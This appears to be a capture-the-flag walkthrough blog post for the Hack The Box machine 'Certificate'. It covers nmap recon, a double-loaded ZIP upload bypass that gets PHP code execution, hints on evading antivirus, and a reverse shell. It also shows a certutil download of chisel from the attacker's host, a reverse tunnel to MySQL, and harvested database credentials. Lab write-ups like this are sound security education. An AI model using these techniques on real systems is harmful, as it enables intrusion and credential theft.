---
layout: post
title: "HTB: Certificate"
date: 2025-10-05
tags: htb active-directory winrar chisel mysql adcs ESC3 SeManageVolumePrivilege certutil certipy
description: Certificate is a hard Windows machine that had a very interesting technique for bypassing file uploads using a double loaded ZIP file. This allowed us to write PHP code to the web server and gained our initial foothold. One of the password hashes in the local MySQL database can be cracked, and after logging on to the machine as this user, we discover a pcap file in their Documents directory. We'll extract AS REQ packets from this pcap to crack and pivot to another user that is an Enrollment Agent, allowing us to perform ESC3 to request certificates on behalf of another user. We'll target a user that has SeManageVolumePrivilege permissions, and abuse it to extract the CA's private key to forge a certificate as the administrator to escalate to domain admin.
image: /assets/img/2025-10-05-htb-certificate/logo.png
---

## Recon

### nmap

```
# Nmap 7.95 scan initiated Fri Oct  3 06:40:31 2025 as: /usr/lib/nmap/nmap -Pn -p 53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49667,49691,49692,49693,49712,60344,60359 -sSCV -vv -oN nmap.txt 10.129.249.89
Nmap scan report for 10.129.249.89
Host is up, received user-set (0.11s latency).
Scanned at 2025-10-03 06:40:36 +08 for 103s

PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
80/tcp    open  http          syn-ack ttl 127 Apache httpd 2.4.58 (OpenSSL/3.1.3 PHP/8.0.30)
|_http-title: Did not follow redirect to http://certificate.htb/
|_http-server-header: Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.0.30
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-10-02 22:41:34Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: certificate.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.certificate.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.certificate.htb
| Issuer: commonName=Certificate-LTD-CA/domainComponent=certificate
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-11-04T03:14:54
| Not valid after:  2025-11-04T03:14:54
| MD5:   0252:f5f4:2869:d957:e8fa:5c19:dfc5:d8ba
| SHA-1: 779a:97b1:d8e4:92b5:bafe:bc02:3388:45ff:dff7:6ad2
| -----BEGIN CERTIFICATE-----
| MIIGTDCCBTSgAwIBAgITWAAAAALKcOpOQvIYpgAAAAAAAjANBgkqhkiG9w0BAQsF
| ADBPMRMwEQYKCZImiZPyLGQBGRYDaHRiMRswGQYKCZImiZPyLGQBGRYLY2VydGlm
| aWNhdGUxGzAZBgNVBAMTEkNlcnRpZmljYXRlLUxURC1DQTAeFw0yNDExMDQwMzE0
| NTRaFw0yNTExMDQwMzE0NTRaMB8xHTAbBgNVBAMTFERDMDEuY2VydGlmaWNhdGUu
| aHRiMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAokh23/3HZrU3FA6t
| JQFbvrM0+ee701Q0/0M4ZQ3r1THuGXvtHnqHFBjJSY/p0SQ0j/jeCAiSwlnG/Wf6
| 6px9rUwjG7gfzH6WqoAMOlpf+HMJ+ypwH59+tktARf17OrrnMHMYXwwILUZfJjH1
| 73VnWwxodz32ZKklgqeHLASWke63yp7QM31vnZBnolofe6gV3pf6ZEJ58sNY+X9A
| t+cFnBtJcQ7TbxhB7zJHICHHn2qFRxL7u6GPPMeC0KdL8zDskn34UZpK6gyV+bNM
| G78cW3QFP00i+ixHkPUxGZho8b708FfRbEKuxSzL4auGuAhsE+ElWna1fBiuhmCY
| DNnA7QIDAQABo4IDTzCCA0swLwYJKwYBBAGCNxQCBCIeIABEAG8AbQBhAGkAbgBD
| AG8AbgB0AHIAbwBsAGwAZQByMB0GA1UdJQQWMBQGCCsGAQUFBwMCBggrBgEFBQcD
| ATAOBgNVHQ8BAf8EBAMCBaAweAYJKoZIhvcNAQkPBGswaTAOBggqhkiG9w0DAgIC
| AIAwDgYIKoZIhvcNAwQCAgCAMAsGCWCGSAFlAwQBKjALBglghkgBZQMEAS0wCwYJ
| YIZIAWUDBAECMAsGCWCGSAFlAwQBBTAHBgUrDgMCBzAKBggqhkiG9w0DBzAdBgNV
| HQ4EFgQURw6wHadBRcMGfsqMbHNqwpNKRi4wHwYDVR0jBBgwFoAUOuH3UW3vrUoY
| d0Gju7uF5m6Uc6IwgdEGA1UdHwSByTCBxjCBw6CBwKCBvYaBumxkYXA6Ly8vQ049
| Q2VydGlmaWNhdGUtTFRELUNBLENOPURDMDEsQ049Q0RQLENOPVB1YmxpYyUyMEtl
| eSUyMFNlcnZpY2VzLENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9Y2Vy
| dGlmaWNhdGUsREM9aHRiP2NlcnRpZmljYXRlUmV2b2NhdGlvbkxpc3Q/YmFzZT9v
| YmplY3RDbGFzcz1jUkxEaXN0cmlidXRpb25Qb2ludDCByAYIKwYBBQUHAQEEgbsw
| gbgwgbUGCCsGAQUFBzAChoGobGRhcDovLy9DTj1DZXJ0aWZpY2F0ZS1MVEQtQ0Es
| Q049QUlBLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNlcnZpY2VzLENO
| PUNvbmZpZ3VyYXRpb24sREM9Y2VydGlmaWNhdGUsREM9aHRiP2NBQ2VydGlmaWNh
| dGU/YmFzZT9vYmplY3RDbGFzcz1jZXJ0aWZpY2F0aW9uQXV0aG9yaXR5MEAGA1Ud
| EQQ5MDegHwYJKwYBBAGCNxkBoBIEEAdHN3ziVeJEnb0gcZhtQbWCFERDMDEuY2Vy
| dGlmaWNhdGUuaHRiME4GCSsGAQQBgjcZAgRBMD+gPQYKKwYBBAGCNxkCAaAvBC1T
| LTEtNS0yMS01MTU1Mzc2NjktNDIyMzY4NzE5Ni0zMjQ5NjkwNTgzLTEwMDAwDQYJ
| KoZIhvcNAQELBQADggEBAIEvfy33XN4pVXmVNJW7yOdOTdnpbum084aK28U/AewI
| UUN3ZXQsW0ZnGDJc0R1b1HPcxKdOQ/WLS/FfTdu2YKmDx6QAEjmflpoifXvNIlMz
| qVMbT3PvidWtrTcmZkI9zLhbsneGFAAHkfeGeVpgDl4OylhEPC1Du2LXj1mZ6CPO
| UsAhYCGB6L/GNOqpV3ltRu9XOeMMZd9daXHDQatNud9gGiThPOUxFnA2zAIem/9/
| UJTMmj8IP/oyAEwuuiT18WbLjEZG+ALBoJwBjcXY6x2eKFCUvmdqVj1LvH9X+H3q
| S6T5Az4LLg9d2oa4YTDC7RqiubjJbZyF2C3jLIWQmA8=
|_-----END CERTIFICATE-----
|_ssl-date: 2025-10-02T22:43:20+00:00; +1m02s from scanner time.
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: certificate.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-10-02T22:43:20+00:00; +1m03s from scanner time.
| ssl-cert: Subject: commonName=DC01.certificate.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.certificate.htb
| Issuer: commonName=Certificate-LTD-CA/domainComponent=certificate
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-11-04T03:14:54
| Not valid after:  2025-11-04T03:14:54
| MD5:   0252:f5f4:2869:d957:e8fa:5c19:dfc5:d8ba
| SHA-1: 779a:97b1:d8e4:92b5:bafe:bc02:3388:45ff:dff7:6ad2
| -----BEGIN CERTIFICATE-----
| MIIGTDCCBTSgAwIBAgITWAAAAALKcOpOQvIYpgAAAAAAAjANBgkqhkiG9w0BAQsF
| ADBPMRMwEQYKCZImiZPyLGQBGRYDaHRiMRswGQYKCZImiZPyLGQBGRYLY2VydGlm
| aWNhdGUxGzAZBgNVBAMTEkNlcnRpZmljYXRlLUxURC1DQTAeFw0yNDExMDQwMzE0
| NTRaFw0yNTExMDQwMzE0NTRaMB8xHTAbBgNVBAMTFERDMDEuY2VydGlmaWNhdGUu
| aHRiMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAokh23/3HZrU3FA6t
| JQFbvrM0+ee701Q0/0M4ZQ3r1THuGXvtHnqHFBjJSY/p0SQ0j/jeCAiSwlnG/Wf6
| 6px9rUwjG7gfzH6WqoAMOlpf+HMJ+ypwH59+tktARf17OrrnMHMYXwwILUZfJjH1
| 73VnWwxodz32ZKklgqeHLASWke63yp7QM31vnZBnolofe6gV3pf6ZEJ58sNY+X9A
| t+cFnBtJcQ7TbxhB7zJHICHHn2qFRxL7u6GPPMeC0KdL8zDskn34UZpK6gyV+bNM
| G78cW3QFP00i+ixHkPUxGZho8b708FfRbEKuxSzL4auGuAhsE+ElWna1fBiuhmCY
| DNnA7QIDAQABo4IDTzCCA0swLwYJKwYBBAGCNxQCBCIeIABEAG8AbQBhAGkAbgBD
| AG8AbgB0AHIAbwBsAGwAZQByMB0GA1UdJQQWMBQGCCsGAQUFBwMCBggrBgEFBQcD
| ATAOBgNVHQ8BAf8EBAMCBaAweAYJKoZIhvcNAQkPBGswaTAOBggqhkiG9w0DAgIC
| AIAwDgYIKoZIhvcNAwQCAgCAMAsGCWCGSAFlAwQBKjALBglghkgBZQMEAS0wCwYJ
| YIZIAWUDBAECMAsGCWCGSAFlAwQBBTAHBgUrDgMCBzAKBggqhkiG9w0DBzAdBgNV
| HQ4EFgQURw6wHadBRcMGfsqMbHNqwpNKRi4wHwYDVR0jBBgwFoAUOuH3UW3vrUoY
| d0Gju7uF5m6Uc6IwgdEGA1UdHwSByTCBxjCBw6CBwKCBvYaBumxkYXA6Ly8vQ049
| Q2VydGlmaWNhdGUtTFRELUNBLENOPURDMDEsQ049Q0RQLENOPVB1YmxpYyUyMEtl
| eSUyMFNlcnZpY2VzLENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9Y2Vy
| dGlmaWNhdGUsREM9aHRiP2NlcnRpZmljYXRlUmV2b2NhdGlvbkxpc3Q/YmFzZT9v
| YmplY3RDbGFzcz1jUkxEaXN0cmlidXRpb25Qb2ludDCByAYIKwYBBQUHAQEEgbsw
| gbgwgbUGCCsGAQUFBzAChoGobGRhcDovLy9DTj1DZXJ0aWZpY2F0ZS1MVEQtQ0Es
| Q049QUlBLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNlcnZpY2VzLENO
| PUNvbmZpZ3VyYXRpb24sREM9Y2VydGlmaWNhdGUsREM9aHRiP2NBQ2VydGlmaWNh
| dGU/YmFzZT9vYmplY3RDbGFzcz1jZXJ0aWZpY2F0aW9uQXV0aG9yaXR5MEAGA1Ud
| EQQ5MDegHwYJKwYBBAGCNxkBoBIEEAdHN3ziVeJEnb0gcZhtQbWCFERDMDEuY2Vy
| dGlmaWNhdGUuaHRiME4GCSsGAQQBgjcZAgRBMD+gPQYKKwYBBAGCNxkCAaAvBC1T
| LTEtNS0yMS01MTU1Mzc2NjktNDIyMzY4NzE5Ni0zMjQ5NjkwNTgzLTEwMDAwDQYJ
| KoZIhvcNAQELBQADggEBAIEvfy33XN4pVXmVNJW7yOdOTdnpbum084aK28U/AewI
| UUN3ZXQsW0ZnGDJc0R1b1HPcxKdOQ/WLS/FfTdu2YKmDx6QAEjmflpoifXvNIlMz
| qVMbT3PvidWtrTcmZkI9zLhbsneGFAAHkfeGeVpgDl4OylhEPC1Du2LXj1mZ6CPO
| UsAhYCGB6L/GNOqpV3ltRu9XOeMMZd9daXHDQatNud9gGiThPOUxFnA2zAIem/9/
| UJTMmj8IP/oyAEwuuiT18WbLjEZG+ALBoJwBjcXY6x2eKFCUvmdqVj1LvH9X+H3q
| S6T5Az4LLg9d2oa4YTDC7RqiubjJbZyF2C3jLIWQmA8=
|_-----END CERTIFICATE-----
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: certificate.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-10-02T22:43:20+00:00; +1m03s from scanner time.
| ssl-cert: Subject: commonName=DC01.certificate.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.certificate.htb
| Issuer: commonName=Certificate-LTD-CA/domainComponent=certificate
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-11-04T03:14:54
| Not valid after:  2025-11-04T03:14:54
| MD5:   0252:f5f4:2869:d957:e8fa:5c19:dfc5:d8ba
| SHA-1: 779a:97b1:d8e4:92b5:bafe:bc02:3388:45ff:dff7:6ad2
| -----BEGIN CERTIFICATE-----
| MIIGTDCCBTSgAwIBAgITWAAAAALKcOpOQvIYpgAAAAAAAjANBgkqhkiG9w0BAQsF
| ADBPMRMwEQYKCZImiZPyLGQBGRYDaHRiMRswGQYKCZImiZPyLGQBGRYLY2VydGlm
| aWNhdGUxGzAZBgNVBAMTEkNlcnRpZmljYXRlLUxURC1DQTAeFw0yNDExMDQwMzE0
| NTRaFw0yNTExMDQwMzE0NTRaMB8xHTAbBgNVBAMTFERDMDEuY2VydGlmaWNhdGUu
| aHRiMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAokh23/3HZrU3FA6t
| JQFbvrM0+ee701Q0/0M4ZQ3r1THuGXvtHnqHFBjJSY/p0SQ0j/jeCAiSwlnG/Wf6
| 6px9rUwjG7gfzH6WqoAMOlpf+HMJ+ypwH59+tktARf17OrrnMHMYXwwILUZfJjH1
| 73VnWwxodz32ZKklgqeHLASWke63yp7QM31vnZBnolofe6gV3pf6ZEJ58sNY+X9A
| t+cFnBtJcQ7TbxhB7zJHICHHn2qFRxL7u6GPPMeC0KdL8zDskn34UZpK6gyV+bNM
| G78cW3QFP00i+ixHkPUxGZho8b708FfRbEKuxSzL4auGuAhsE+ElWna1fBiuhmCY
| DNnA7QIDAQABo4IDTzCCA0swLwYJKwYBBAGCNxQCBCIeIABEAG8AbQBhAGkAbgBD
| AG8AbgB0AHIAbwBsAGwAZQByMB0GA1UdJQQWMBQGCCsGAQUFBwMCBggrBgEFBQcD
| ATAOBgNVHQ8BAf8EBAMCBaAweAYJKoZIhvcNAQkPBGswaTAOBggqhkiG9w0DAgIC
| AIAwDgYIKoZIhvcNAwQCAgCAMAsGCWCGSAFlAwQBKjALBglghkgBZQMEAS0wCwYJ
| YIZIAWUDBAECMAsGCWCGSAFlAwQBBTAHBgUrDgMCBzAKBggqhkiG9w0DBzAdBgNV
| HQ4EFgQURw6wHadBRcMGfsqMbHNqwpNKRi4wHwYDVR0jBBgwFoAUOuH3UW3vrUoY
| d0Gju7uF5m6Uc6IwgdEGA1UdHwSByTCBxjCBw6CBwKCBvYaBumxkYXA6Ly8vQ049
| Q2VydGlmaWNhdGUtTFRELUNBLENOPURDMDEsQ049Q0RQLENOPVB1YmxpYyUyMEtl
| eSUyMFNlcnZpY2VzLENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9Y2Vy
| dGlmaWNhdGUsREM9aHRiP2NlcnRpZmljYXRlUmV2b2NhdGlvbkxpc3Q/YmFzZT9v
| YmplY3RDbGFzcz1jUkxEaXN0cmlidXRpb25Qb2ludDCByAYIKwYBBQUHAQEEgbsw
| gbgwgbUGCCsGAQUFBzAChoGobGRhcDovLy9DTj1DZXJ0aWZpY2F0ZS1MVEQtQ0Es
| Q049QUlBLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNlcnZpY2VzLENO
| PUNvbmZpZ3VyYXRpb24sREM9Y2VydGlmaWNhdGUsREM9aHRiP2NBQ2VydGlmaWNh
| dGU/YmFzZT9vYmplY3RDbGFzcz1jZXJ0aWZpY2F0aW9uQXV0aG9yaXR5MEAGA1Ud
| EQQ5MDegHwYJKwYBBAGCNxkBoBIEEAdHN3ziVeJEnb0gcZhtQbWCFERDMDEuY2Vy
| dGlmaWNhdGUuaHRiME4GCSsGAQQBgjcZAgRBMD+gPQYKKwYBBAGCNxkCAaAvBC1T
| LTEtNS0yMS01MTU1Mzc2NjktNDIyMzY4NzE5Ni0zMjQ5NjkwNTgzLTEwMDAwDQYJ
| KoZIhvcNAQELBQADggEBAIEvfy33XN4pVXmVNJW7yOdOTdnpbum084aK28U/AewI
| UUN3ZXQsW0ZnGDJc0R1b1HPcxKdOQ/WLS/FfTdu2YKmDx6QAEjmflpoifXvNIlMz
| qVMbT3PvidWtrTcmZkI9zLhbsneGFAAHkfeGeVpgDl4OylhEPC1Du2LXj1mZ6CPO
| UsAhYCGB6L/GNOqpV3ltRu9XOeMMZd9daXHDQatNud9gGiThPOUxFnA2zAIem/9/
| UJTMmj8IP/oyAEwuuiT18WbLjEZG+ALBoJwBjcXY6x2eKFCUvmdqVj1LvH9X+H3q
| S6T5Az4LLg9d2oa4YTDC7RqiubjJbZyF2C3jLIWQmA8=
|_-----END CERTIFICATE-----
3269/tcp  open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: certificate.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-10-02T22:43:20+00:00; +1m01s from scanner time.
| ssl-cert: Subject: commonName=DC01.certificate.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.certificate.htb
| Issuer: commonName=Certificate-LTD-CA/domainComponent=certificate
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-11-04T03:14:54
| Not valid after:  2025-11-04T03:14:54
| MD5:   0252:f5f4:2869:d957:e8fa:5c19:dfc5:d8ba
| SHA-1: 779a:97b1:d8e4:92b5:bafe:bc02:3388:45ff:dff7:6ad2
| -----BEGIN CERTIFICATE-----
| MIIGTDCCBTSgAwIBAgITWAAAAALKcOpOQvIYpgAAAAAAAjANBgkqhkiG9w0BAQsF
| ADBPMRMwEQYKCZImiZPyLGQBGRYDaHRiMRswGQYKCZImiZPyLGQBGRYLY2VydGlm
| aWNhdGUxGzAZBgNVBAMTEkNlcnRpZmljYXRlLUxURC1DQTAeFw0yNDExMDQwMzE0
| NTRaFw0yNTExMDQwMzE0NTRaMB8xHTAbBgNVBAMTFERDMDEuY2VydGlmaWNhdGUu
| aHRiMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAokh23/3HZrU3FA6t
| JQFbvrM0+ee701Q0/0M4ZQ3r1THuGXvtHnqHFBjJSY/p0SQ0j/jeCAiSwlnG/Wf6
| 6px9rUwjG7gfzH6WqoAMOlpf+HMJ+ypwH59+tktARf17OrrnMHMYXwwILUZfJjH1
| 73VnWwxodz32ZKklgqeHLASWke63yp7QM31vnZBnolofe6gV3pf6ZEJ58sNY+X9A
| t+cFnBtJcQ7TbxhB7zJHICHHn2qFRxL7u6GPPMeC0KdL8zDskn34UZpK6gyV+bNM
| G78cW3QFP00i+ixHkPUxGZho8b708FfRbEKuxSzL4auGuAhsE+ElWna1fBiuhmCY
| DNnA7QIDAQABo4IDTzCCA0swLwYJKwYBBAGCNxQCBCIeIABEAG8AbQBhAGkAbgBD
| AG8AbgB0AHIAbwBsAGwAZQByMB0GA1UdJQQWMBQGCCsGAQUFBwMCBggrBgEFBQcD
| ATAOBgNVHQ8BAf8EBAMCBaAweAYJKoZIhvcNAQkPBGswaTAOBggqhkiG9w0DAgIC
| AIAwDgYIKoZIhvcNAwQCAgCAMAsGCWCGSAFlAwQBKjALBglghkgBZQMEAS0wCwYJ
| YIZIAWUDBAECMAsGCWCGSAFlAwQBBTAHBgUrDgMCBzAKBggqhkiG9w0DBzAdBgNV
| HQ4EFgQURw6wHadBRcMGfsqMbHNqwpNKRi4wHwYDVR0jBBgwFoAUOuH3UW3vrUoY
| d0Gju7uF5m6Uc6IwgdEGA1UdHwSByTCBxjCBw6CBwKCBvYaBumxkYXA6Ly8vQ049
| Q2VydGlmaWNhdGUtTFRELUNBLENOPURDMDEsQ049Q0RQLENOPVB1YmxpYyUyMEtl
| eSUyMFNlcnZpY2VzLENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9Y2Vy
| dGlmaWNhdGUsREM9aHRiP2NlcnRpZmljYXRlUmV2b2NhdGlvbkxpc3Q/YmFzZT9v
| YmplY3RDbGFzcz1jUkxEaXN0cmlidXRpb25Qb2ludDCByAYIKwYBBQUHAQEEgbsw
| gbgwgbUGCCsGAQUFBzAChoGobGRhcDovLy9DTj1DZXJ0aWZpY2F0ZS1MVEQtQ0Es
| Q049QUlBLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNlcnZpY2VzLENO
| PUNvbmZpZ3VyYXRpb24sREM9Y2VydGlmaWNhdGUsREM9aHRiP2NBQ2VydGlmaWNh
| dGU/YmFzZT9vYmplY3RDbGFzcz1jZXJ0aWZpY2F0aW9uQXV0aG9yaXR5MEAGA1Ud
| EQQ5MDegHwYJKwYBBAGCNxkBoBIEEAdHN3ziVeJEnb0gcZhtQbWCFERDMDEuY2Vy
| dGlmaWNhdGUuaHRiME4GCSsGAQQBgjcZAgRBMD+gPQYKKwYBBAGCNxkCAaAvBC1T
| LTEtNS0yMS01MTU1Mzc2NjktNDIyMzY4NzE5Ni0zMjQ5NjkwNTgzLTEwMDAwDQYJ
| KoZIhvcNAQELBQADggEBAIEvfy33XN4pVXmVNJW7yOdOTdnpbum084aK28U/AewI
| UUN3ZXQsW0ZnGDJc0R1b1HPcxKdOQ/WLS/FfTdu2YKmDx6QAEjmflpoifXvNIlMz
| qVMbT3PvidWtrTcmZkI9zLhbsneGFAAHkfeGeVpgDl4OylhEPC1Du2LXj1mZ6CPO
| UsAhYCGB6L/GNOqpV3ltRu9XOeMMZd9daXHDQatNud9gGiThPOUxFnA2zAIem/9/
| UJTMmj8IP/oyAEwuuiT18WbLjEZG+ALBoJwBjcXY6x2eKFCUvmdqVj1LvH9X+H3q
| S6T5Az4LLg9d2oa4YTDC7RqiubjJbZyF2C3jLIWQmA8=
|_-----END CERTIFICATE-----
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
49667/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49691/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49692/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49693/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49712/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
60344/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
60359/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
Service Info: Hosts: certificate.htb, DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 58799/tcp): CLEAN (Timeout)
|   Check 2 (port 62882/tcp): CLEAN (Timeout)
|   Check 3 (port 47981/udp): CLEAN (Timeout)
|   Check 4 (port 28953/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-10-02T22:42:43
|_  start_date: N/A
|_clock-skew: mean: 1m01s, deviation: 1s, median: 1m01s

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Oct  3 06:42:19 2025 -- 1 IP address (1 host up) scanned in 107.61 seconds
```

Nmap scan shows that this is a domain controller. The domain is certificate.htb and the hostname is DC01.
Also note that ADCS is configured for this domain. I'll add the domain entries to my hosts file.

```
nxc smb 10.129.249.89 --generate-hosts-file hosts
10.129.249.89     DC01.certificate.htb certificate.htb DC01

cat hosts | sudo tee -a /etc/hosts
```

It's also worth noting that the web server running on port 80 isnt' Microsoft IIS, but instead httpd.
Normally I'd expect Microsoft IIS for Windows environments, so it's likely the web application here is running on something like XAMPP, which is another popular web server (usually for local development) on Windows.

### Initial Enumeration

Initial enumeration shows that guest accounts, anonymous SMB sessions, and null LDAP binds were disabled.
We turn our focus to the web application.

![alt text](/assets/img/2025-10-05-htb-certificate/web-home.png)
_Landing page_

The website is an e-learning platform built using PHP, and it's used for taking certificates.
We can do self-registration, and can choose to register as a student or a teacher.
However, registering as a teacher requires manual approval for account activation, so we proceeded as a student.

![alt text](/assets/img/2025-10-05-htb-certificate/registration.png)
_Registration page_


After logging in, we can enroll ourselves in a course, and this gives us the option to answer quizzes.

![alt text](/assets/img/2025-10-05-htb-certificate/courses.png)
_Course page_

## Shell as xamppuser

### File upload bypass using double loaded ZIP

The assignment upload only accepts certain file types.
What's interesting to us is the option to upload our assignments in a ZIP file.
My first intuition here is to look for zipslip vulnerabilities since the website unzips it to `/static/uploads/<hash>/` after uploading, and if we could write/overwrite files outside of that directory, we could potentially get code execution.

![alt text](/assets/img/2025-10-05-htb-certificate/quiz.png)
_Quiz submission page_

That didn't work... But I did find some odd behaviours while looking for zip vulnerabilities:
- If our ZIP contains more than 1 file, it gets rejected.
- It doesn't validate the file's magic bytes when uploading attachments, as long as the file ends with one of the valid extensions, i.e `foo.txt.pdf` . This isn't that useful since we can't use this trick to execute PHP.

The trick here is in how different archiving tools handle ZIP content.
There's a very good [blog post](https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/double-loaded-zip-file-delivers-nanocore/) by Trustwave that goes into detail about the technique that we're going to use here.
Essentially, when concatenating multiple ZIP files together into one, certain archiving tools will gladly extract everything including the smuggled ZIP.

This makes more sense when you look at the source code for the file upload vulnerability (taken after finishing the lab).

```php
 if ($fileExtension === 'zip') {
    // Extract ZIP file contents
    $zip = new ZipArchive();
    if ($zip->open($fileTmpPath) === true) {
        if ($zip->count() > 1) {
            $message = "Please Include a single assignment file in the archive";
            exit;
        } else {
            $innerFileName = $zip->getNameIndex(0);
            if (!in_array(pathinfo($innerFileName, PATHINFO_EXTENSION), $allowedExtensions)) {
                http_response_code(400);
                echo "<h1>400 Bad Request</h1>";
                echo "<p>The request you sent contains bad or malicious content(Invalid Extension).</p>";
                exit;
            }
        }
    echo exec('"C:\\Program Files\\WinRAR\\WinRAR.exe" x -y ' . $fileTmpPath . " " . $destinationDir);
    $zip->close();
...[SNIP]...
```

The technique allows us to pass the first check because the application only sees the normal file in the ZIP, but when WinRAR extracts it, it sees the second file header for our smuggled ZIP and will gladly extract it to the web directory, allowing us to write PHP files and get code execution.

To confirm that we have PHP code execution, I used a simple echo for sanity check.

```php
<?php echo "asdlkfadfjladsf"; ?>
```

Create our double loaded ZIP.

```shell
# Benign ZIP
zip a.zip test.pdf

# ZIP containing our PHP code
zip b.zip test.php

# Doule loaded ZIP
cat a.zip b.zip > c.zip
```

The website only gives us the URL to the benign file in the first ZIP, but if we navigate to the PHP file under the same directory, we get PHP code execution!

![alt text](/assets/img/2025-10-05-htb-certificate/phpexec.png)

Now that we've confirmed code execution, I tried uploading PHP files to execute system commands, but they were quickly getting removed from the website.
This meant that the machine likely had anti-virus enabled and our PHP code was getting detected.
Here, I noticed that using `passthru` and using the `_REQUEST` or `_POST` superglobals were triggering it.
I was able to get working command execution using `system` and `_GET`, then I used [Ivan Sincek's PHP reverse shell](https://github.com/ivan-sincek/php-reverse-shell) to get a shell as xamppuser.

## Shell as sara.b

### Findings credentials from the database

The xamppuser user account doesn't have any special privileges, so I looked for credentials to pivot.
I found the database connection file in `c:\xampp\htdocs\certificate.htb\db.php`.

```shell
C:\xampp\htdocs\certificate.htb>type db.php
<?php
// Database connection using PDO
try {
    $dsn = 'mysql:host=localhost;dbname=Certificate_WEBAPP_DB;charset=utf8mb4';
    $db_user = 'certificate_webapp_user'; // Change to your DB username
    $db_passwd = 'cert!f!c@teDBPWD'; // Change to your DB password
    $options = [
        PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION,
        PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC,
    ];
    $pdo = new PDO($dsn, $db_user, $db_passwd, $options);
} catch (PDOException $e) {
    die('Database connection failed: ' . $e->getMessage());
}
?>
```

Because we don't have an interactive shell, it's a bit difficult to work with.
You can use the mysql Windows binary that comes with XAMPP, but you'll have to send your queries in one-liners.
Instead, I'll use chisel to port forward the MySQL connection from the Windows machine to my Linux host and access it locally.

```shell
# On my host
./chisel server --port 1337 --reverse

# Upload chisel to the target
c:\Windows\Temp>certutil -urlcache -f http://10.10.14.34:8000/chisel.exe chisel.exe

# Port forward MySQL to my host
c:\Windows\Temp>.\chisel.exe client 10.10.14.34:1337 R:3306:127.0.0.1:3306
```

Then, I can use the credentials discovered earlier to access the MySQL database from my Linux host.

```shell
mysql -u certificate_webapp_user -h 127.0.0.1 -P 3306 --skip-ssl -p 
Enter password: 
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 14
Server version: 10.4.32-MariaDB mariadb.org binary distribution

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Support MariaDB developers by giving a star at https://github.com/MariaDB/server
Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]>
```

